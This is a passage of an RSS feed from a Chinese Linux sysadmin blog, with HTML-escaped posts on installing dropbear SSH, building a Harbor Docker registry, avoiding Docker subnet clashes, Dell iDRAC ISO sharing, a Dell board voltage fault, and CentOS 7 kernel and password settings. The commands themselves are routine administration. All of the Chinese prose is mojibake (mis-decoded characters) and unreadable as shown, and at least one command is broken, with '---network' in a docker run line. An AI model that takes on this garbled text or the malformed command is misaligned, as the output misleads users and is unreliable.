dropbearä½œä¸ºä¸€æ¬¾åŸºäºsshåè®®çš„è½»é‡çº§sshdæœåŠ¡å™¨ï¼Œç›¸æ¯”OpenSSHï¼Œå…¶æ›´ç®€æ´ï¼Œæ›´å°å·§ï¼Œè¿è¡Œèµ·æ¥å†…å­˜å ç”¨æ¯”ä¹Ÿæ›´å°ã€‚åœ¨åº”ç”¨è¿›ç¨‹ä¸Šï¼ŒOpenSSHä¼šå¼€å¯ä¸¤ä¸ªsshdè¿›ç¨‹æœåŠ¡ï¼Œè€Œdropbearåªå¼€å¯ä¸€ä¸ªè¿›ç¨‹ï¼Œç›¸è¾ƒäºOpenSSHï¼Œå…¶å¯¹äºç¡¬ä»¶è¦æ±‚ä¹Ÿæ›´ä½ï¼Œä¹Ÿæ›´èŠ‚çº¦ç³»ç»Ÿèµ„æºã€‚&lt;/p&gt;
&lt;p&gt;dropbearå®ç°å®Œæ•´çš„SSHå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç‰ˆæœ¬2åè®®ï¼Œä¸æ”¯æŒSSHç‰ˆæœ¬1åè®®çš„å‘åå…¼å®¹æ€§ï¼Œä»¥èŠ‚çœç©ºé—´å’Œèµ„æºï¼Œå¹¶é¿å…åœ¨SSHç‰ˆæœ¬1çš„å›ºæœ‰çš„å®‰å…¨æ¼æ´ã€‚&lt;/p&gt;
&lt;p&gt;dropbearä¸»è¦æœ‰ä»¥ä¸‹ç¨‹åºï¼š&lt;/p&gt;
&lt;p&gt;æœåŠ¡ç¨‹åºï¼šdropbearï¼ˆç±»ä¼¼äºOpensshçš„sshdï¼‰
å®¢æˆ·ç¨‹åºï¼šdbclinetï¼ˆç´¯ä¸–äºOpensshçš„sshï¼‰
å¯†é’¥ç”Ÿæˆç¨‹åºï¼šdropbearkey&lt;/p&gt;
&lt;p&gt;äºŒã€ä¸‹è½½å®‰è£…&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://matt.ucc.asn.au/dropbear/dropbear-2020.81.tar.bz2
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar jxvf dropbear-2020.81.tar.bz2 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; dropbear-2020.81
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./configure
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;make &lt;span class=&#34;nv&#34;&gt;PROGRAMS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;dropbear dbclient dropbearkey dropbearconvert scp&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;make &lt;span class=&#34;nv&#34;&gt;PROGRAMS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;dropbear dbclient dropbearkey dropbearconvert scp&amp;#34;&lt;/span&gt; install
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir /etc/dropbear/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dropbear -E -p &lt;span class=&#34;m&#34;&gt;2222&lt;/span&gt;   &lt;span class=&#34;c1&#34;&gt;#å¯åŠ¨sshæœåŠ¡&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dropbear -FE -p &lt;span class=&#34;m&#34;&gt;2222&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;#-FæŒ‡å®šå‰å°è¿è¡Œ&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;å®¢æˆ·ç«¯è¿æ¥ï¼š
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh 192.168.89.37 -p &lt;span class=&#34;m&#34;&gt;2222&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;æŠ¥é”™ï¼šzlib error æˆ–è€…make &lt;span class=&#34;nv&#34;&gt;PROGRAMS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;dropbear dbclient dropbearkey dropbearconvert scp&amp;#34;&lt;/span&gt;å‡ºé”™
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;è§£å†³æ–¹æ³•ï¼š
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://www.zlib.net/fossils/zlib-1.2.10.tar.gz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;tar zxvf zlib-1.2.10.tar.gz 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; zlib-1.2.10
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;./configure --prefix&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/local/zlib
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;++++++++++++++++++++++++++++++++++++++++++++++++++++++++&lt;/p&gt;</description>
    </item>
    <item>
      <title>dockeré•œåƒä»“åº“harborçš„æ­å»ºä¸ä½¿ç”¨</title>
      <link>https://rendoumi.com/posts/20221219-docker_harbor/</link>
      <pubDate>Mon, 19 Dec 2022 09:04:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221219-docker_harbor/</guid>
      <description>&lt;p&gt;ä¸€ï¼šæˆ‘ä»¬åœ¨å…¬å¸å†…éƒ¨å»ºç«‹äº†Dockerå†…éƒ¨é•œåƒä»“åº“ï¼š&lt;/p&gt;
&lt;p&gt;harboræ˜¯vmwareå‡ºçš„ä¸€ä¸ªdockeré•œåƒä»“åº“ï¼Œæœ¬è´¨æ˜¯ä¸€ç»„å®¹å™¨çš„é›†åˆä½“ï¼Œç®—æ˜¯ä¸€ä¸ªå¤šå®¹å™¨çš„pod.&lt;/p&gt;
&lt;p&gt;æ•°æ®å·ç¼ºçœæ˜¯å®¿ä¸»æœºçš„/dataï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠiscsiuæŒ‚åœ¨/data&lt;/p&gt;
&lt;p&gt;ä¸»æœºï¼š172.18.31.28&lt;/p&gt;
&lt;p&gt;é¦–å…ˆå®‰è£…docker-ce&lt;/p&gt;
&lt;p&gt;æ·»åŠ docker-ceæºï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;yum install epel-release

yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo

yum install docker-ce -y

yum install ntp -y
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯åŠ¨è‡ªåŠ¨åŒæ­¥æ—¶é—´:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;timedatectl set-ntp yes  #æ­¤å¤„å¯ç”¨yes,no,1æˆ–0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é…ç½®æ—¶åŒº:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;timedatectl set-timezone Asia/Shanghai
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;é…ç½®Dockerå¯åŠ¨å‚æ•°ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mkdir -p /etc/docker
cat &amp;lt;&amp;lt; EOF &amp;gt;&amp;gt; /etc/docker/daemon.json
{
    &amp;quot;registry-mirrors&amp;quot;: [&amp;quot;https://docker.mirrors.ustc.edu.cn/&amp;quot;]
}
EOF
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¹‹åè£…çš„æ‰€æœ‰Dockerçš„å®¿ä¸»æœºï¼Œå¦‚æœè¦ç”¨åˆ°è¿™ä¸ªç§æœ‰ä»“åº“çš„è¯ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cat &amp;lt;&amp;lt; EOF &amp;gt;&amp;gt; /etc/docker/daemon.json
{
     &amp;quot;insecure-registries&amp;quot;:[&amp;quot;172.18.31.28&amp;quot;],
     &amp;quot;registry-mirrors&amp;quot;: [&amp;quot;https://docker.mirrors.ustc.edu.cn/&amp;quot;]
}
EOF
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¯åŠ¨docker&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;systemctl enable docker &amp;amp;&amp;amp; systemctl start docker
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;â€‹
å®‰è£…Docker-compose&lt;/p&gt;</description>
    </item>
    <item>
      <title>Dockerçš„ç¼ºçœç½‘æ®µå†²çªé—®é¢˜</title>
      <link>https://rendoumi.com/posts/20221219-docker_network/</link>
      <pubDate>Mon, 19 Dec 2022 09:02:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221219-docker_network/</guid>
      <description>&lt;p&gt;dockeré»˜è®¤ç½‘æ®µæ˜¯172.17ï¼Œå’Œå…¬å¸çš„ç½‘æ®µ172.16å’Œ172.18æœ‰æ—¶å€™ä¼šå†²çªï¼Œè§£å†³æ–¹æ³•å°±æ˜¯æ¢dockerç½‘æ®µã€‚&lt;/p&gt;
&lt;p&gt;æ–¹æ¡ˆï¼šä¸æ”¹dockerç½‘æ®µï¼Œåˆ›å»ºä¸å’Œå…¬å¸ç½‘æ®µå†²çªçš„dockerå­ç½‘æ®µ&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker network create --driver&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;bridge --subnet&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;172.19.0.0/24 monitor_net
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿è¡Œå®¹å™¨æ—¶æŒ‡å®š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;docker run -it --name &amp;lt;å®¹å™¨å&amp;gt; ---network monitor_net &amp;lt;é•œåƒå&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åœ¨docker-composeåŒæ ·é€šè¿‡networksæŒ‡å®šï¼Œå½¢å¼å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;version: &lt;span class=&#34;s1&#34;&gt;&amp;#39;3&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;networks:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   monitor:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;c1&#34;&gt;#ä½¿ç”¨å·²ç»å­˜åœ¨çš„ç½‘ç»œ&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     external:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;       name: monitor_net  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;services:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    prometheus:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        image: prom/prometheus
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        container_name: prometheus
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        hostname: prometheus
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        privileged: &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        restart: always
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        volumes:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            - /usr/local/src/config/prometheus.yml:/etc/prometheus/prometheus.yml
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            - /usr/local/src/config/node_down.yml:/etc/prometheus/node_down.yml
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        ports:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            - &lt;span class=&#34;s2&#34;&gt;&amp;#34;9091:9090&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        networks:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            - monitor
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        links:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            - alertmanager
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            - node-exporter
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>DellæœåŠ¡å™¨è®¾ç½®è¿œç¨‹æ–‡ä»¶å…±äº«</title>
      <link>https://rendoumi.com/posts/20221218-dell_idrac_remote_share/</link>
      <pubDate>Sun, 18 Dec 2022 09:07:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221218-dell_idrac_remote_share/</guid>
      <description>&lt;p&gt;DellæœåŠ¡å™¨è®¾ç½®è¿œç¨‹æ–‡ä»¶å…±äº«&lt;/p&gt;
&lt;p&gt;ç”¨æ¥åŠ è½½isoæ–‡ä»¶ï¼Œç”¨äºå®‰è£…ç³»ç»Ÿæˆ–è€…ä¿®å¤&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20221218-dell_idrac_remote_share/2021-10-09_110107.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¾“å…¥172.18.31.2:/export/nfsshare/centos7-live-docker.iso&lt;/p&gt;
&lt;p&gt;ç¼ºçœæ˜¯æ”¯æŒ4ç§æ ¼å¼çš„å…±äº«ï¼š&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;    CIFS â€” //&amp;lt;IP to connect for CIFS file system&amp;gt;/&amp;lt;file path&amp;gt;/&amp;lt;image name&amp;gt;
    NFS â€” &amp;lt; IP to connect for NFS file system&amp;gt;:/&amp;lt;file path&amp;gt;/&amp;lt;image name&amp;gt;
    HTTP â€” http://&amp;lt;URL&amp;gt;/&amp;lt;file path&amp;gt;/&amp;lt;image name&amp;gt;
    HTTPs â€” https://&amp;lt;URL&amp;gt;/&amp;lt;file path&amp;gt;/&amp;lt;image name&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ç‚¹å‡»Connect
&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20221218-dell_idrac_remote_share/2021-10-09_105140.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¥½çš„è¯ï¼Œå°±ä¼šè¹¦å‡ºSuccess
&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20221218-dell_idrac_remote_share/2021-10-09_105201.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åå¯åŠ¨è™šæ‹Ÿæ§åˆ¶å°ï¼ŒBootèœå•é€‰ä¸­å¯åŠ¨ï¼šVirtual CD/DVD/ISO
&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20221218-dell_idrac_remote_share/2021-10-09_111519.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;é‡å¯ï¼Œå°±å¯ä»¥è¿›å…¥centos7-live-docker.isoçš„ç³»ç»Ÿäº†&lt;/p&gt;</description>
    </item>
    <item>
      <title>Dellæœºå™¨ä¸»æ¿VLT0204æ•…éšœå¤„ç†ä»¥åŠå†…å­˜æ’æ³•</title>
      <link>https://rendoumi.com/posts/20221218-dell_memory/</link>
      <pubDate>Sun, 18 Dec 2022 09:06:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221218-dell_memory/</guid>
      <description>&lt;p&gt;vlt0204, NDCç“¦ç‰¹è¶…äº†ï¼Œåæœ‰å…«ä¹æ˜¯ç½‘å¡çƒ§äº†ï¼Œç„¶åå¯¼è‡´ä¸»æ¿ç”µå‹è¿‡è½½ã€‚&lt;/p&gt;
&lt;p&gt;å‰é¢æ¿æ—¥å¿—ï¼šVLT0204ï¼Œç™»å½•idracçœ‹åˆ°æ—¥å¿—ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;The system board NDC PG voltage is outside of range.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20221218-dell_memory/2020-09-15_171556.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;æ‚²å‰§äº†ï¼Œå¯èƒ½æ˜¯ä¸»æ¿çƒ§äº†&lt;/p&gt;
&lt;p&gt;å¤„ç†æ–¹æ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;ä¸€ã€ä¸»æ¿æ”¾ç”µ&lt;/p&gt;
&lt;p&gt;1ã€å…³æœº
2ã€æ‹”ç”µæºçº¿
3ã€é•¿æŒ‰ç”µæºå¼€å…³åŠåˆ†é’Ÿä¸æ”¾æ‰‹
4ã€åŠåˆ†é’Ÿåæ”¾æ‰‹ï¼Œæ¥å›ç”µæºçº¿å¼€æœºçœ‹çœ‹&lt;/p&gt;
&lt;p&gt;å¦‚æœä»¥ä¸Šæ–¹æ³•ä¸è¡Œï¼Œå°±å¿…é¡»é‡‡ç”¨ç¬¬äºŒç§æ–¹æ³•ï¼š&lt;/p&gt;
&lt;p&gt;äºŒã€æœ€å°åŒ–è´Ÿè½½æ’é”™&lt;/p&gt;
&lt;p&gt;1ã€æ‹”æ‰ç”µæº2
2ã€æ‹”æ‰CPU2
3ã€æ‹”æ‰æ‰€æœ‰å†…å­˜ï¼ˆåªç•™1æ¡æˆ–2æ¡ï¼‰
4ã€æ‹”æ‰ç½‘å¡
5ã€å¯åŠ¨çœ‹çœ‹&lt;/p&gt;
&lt;p&gt;R740çš„å†…å­˜æ’æ³•ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20221218-dell_memory/2020-09-15_171736.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;R730çš„å†…å­˜æ’æ³•ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20221218-dell_memory/2020-09-15_171835.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>å‡çº§CentOS7çš„kernelæ ¸å¿ƒ</title>
      <link>https://rendoumi.com/posts/20221218-centos7_upgrade_kernel/</link>
      <pubDate>Sun, 18 Dec 2022 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221218-centos7_upgrade_kernel/</guid>
      <description>&lt;h2 id=&#34;centos7æ›´æ–°å†…æ ¸&#34;&gt;CentOS7æ›´æ–°å†…æ ¸&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;å†…æ ¸ä¸‹è½½åœ°å€ï¼šhttps://elrepo.org/linux/kernel/el7/x86_64/RPMS/&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;å†…æ ¸åŒ…æœ‰ä¸¤ç§ï¼Œmlä¸»æµï¼Œlté•¿æœŸæ”¯æŒã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å‡çº§æ ¸å¿ƒè‚¯å®šæ˜¯ä¸ºäº†ä¸»æµçš„åŠŸèƒ½ï¼Œltè¿˜å‡å®ƒåšç”šã€‚&lt;/p&gt;
&lt;p&gt;#å‡çº§ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rpm -ivh https://elrepo.org/linux/kernel/el7/x86_64/RPMS/kernel-ml-6.1.0-1.el7.elrepo.x86_64.rpm
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;#æŸ¥çœ‹å¯ç”¨å†…æ ¸&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;awk -F&lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;$1==&amp;#34;menuentry &amp;#34; {print i++ &amp;#34; : &amp;#34; $2}&amp;#39;&lt;/span&gt; /etc/grub2.cfg
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;#åˆå§‹åŒ–ç¬¬ä¸€ä¸ªä¸ºé»˜è®¤å†…æ ¸&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;grub2-set-default &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;#é‡æ–°åˆ›å»ºå†…æ ¸é…ç½®&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;grub2-mkconfig -o /boot/grub2/grub.cfg
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;reboot
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;#åç»­æœ‰éœ€è¦å†è£…ï¼Œä¸éœ€è¦æå¼€å‘å°±åˆ«è£…ï¼&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#æ›´æ–°kernel-ml-headers&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rpm -ivh https://elrepo.org/linux/kernel/el7/x86_64/RPMS/kernel-ml-headers-6.1.0-1.el7.elrepo.x86_64.rpm
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#æ›´æ–°kernel-ml-devel&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rpm -ivh https://elrepo.org/linux/kernel/el7/x86_64/RPMS/kernel-ml-devel-6.1.0-1.el7.elrepo.x86_64.rpm
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>åˆè§„è¦æ±‚ä¹‹CentOS7çš„ç”¨æˆ·å¯†ç ç­–ç•¥</title>
      <link>https://rendoumi.com/posts/20221218-centos7_passwd/</link>
      <pubDate>Sun, 18 Dec 2022 09:04:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20221218-centos7_passwd/</guid>
      <description>&lt;p&gt;å„ç§åˆè§„è¦æ±‚ä¸­éƒ½å¯¹ç”¨æˆ·ç­–ç•¥æœ‰ç€è¦æ±‚ï¼Œä»€ä¹ˆPCIå•Šï¼Œä¸Šå¸‚å®¡è®¡å•Šï¼Œéƒ½æœ‰ç€å¯†ç å¤æ‚ç¨‹åº¦çš„è¦æ±‚ï¼š&lt;/p&gt;
&lt;p&gt;CentOS 7 çš„ç”¨æˆ·å¯†ç ç­–ç•¥ï¼š&lt;/p&gt;
&lt;p&gt;ä¿®æ”¹vi /etc/pam.d/system-auth&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20221218-centos7_passwd/2021-01-28_104150.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å…¶ä¸­æœ‰ä¸€è¡Œï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;password    requisite     pam_pwquality.so try_first_pass local_users_only &lt;span class=&#34;nv&#34;&gt;retry&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;authtok_type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;
